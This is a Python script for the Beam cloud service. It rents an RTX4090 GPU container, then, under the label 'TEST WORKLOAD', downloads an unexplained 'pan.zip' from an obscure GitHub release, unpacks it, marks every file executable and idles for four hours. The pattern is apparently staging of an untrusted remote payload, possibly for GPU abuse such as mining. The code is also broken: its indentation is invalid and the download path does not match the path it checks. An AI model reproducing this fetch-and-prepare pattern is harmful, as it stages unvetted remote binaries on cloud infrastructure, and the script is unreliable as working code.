from beam import App, Image
import subprocess
import time

# =====================================================
# APP
# =====================================================

app = App("t4x3-runner")


# =====================================================
# IMAGE
# =====================================================

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y curl ca-certificates unzip git",
    ])
)


# =====================================================
# RUN
# =====================================================

@app.run(
    image=image,
    gpu="RTX4090",
    cpu=4,
    memory="8Gi",
    timeout=4 * 60 * 60,
)
def run_script():

    # =================================================
    # CHECK GPU
    # =================================================

    print("=== CHECK GPU ===")
    subprocess.run(
        ["nvidia-smi"],
        check=False,
    )


    # =================================================
    # TEST WORKLOAD
    # =================================================

   cmd = r"""
   set -e

   echo "=== DOWNLOAD FILE ==="
   wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

   echo "=== CHECK DOWNLOAD ==="
   ls -lh /tmp/pan.zip

   echo "=== EXTRACT ==="
   mkdir -p /tmp/work
   unzip -o /tmp/pan.zip -d /tmp/work

   echo "=== SET PERMISSION ==="
   chmod -R +x /tmp/work

   echo "=== WORK DIRECTORY ==="
   ls -lah /tmp/work

   echo "=== WORKLOAD READY ==="
   """

    result = subprocess.run(
        ["bash", "-lc", cmd],
        check=False,
    )

    print(
        "Process exited with:",
        result.returncode,
    )


    # =================================================
    # KEEP CONTAINER ALIVE
    # =================================================

    print("Keeping the container alive for 4 hours...")

    time.sleep(4 * 60 * 60)
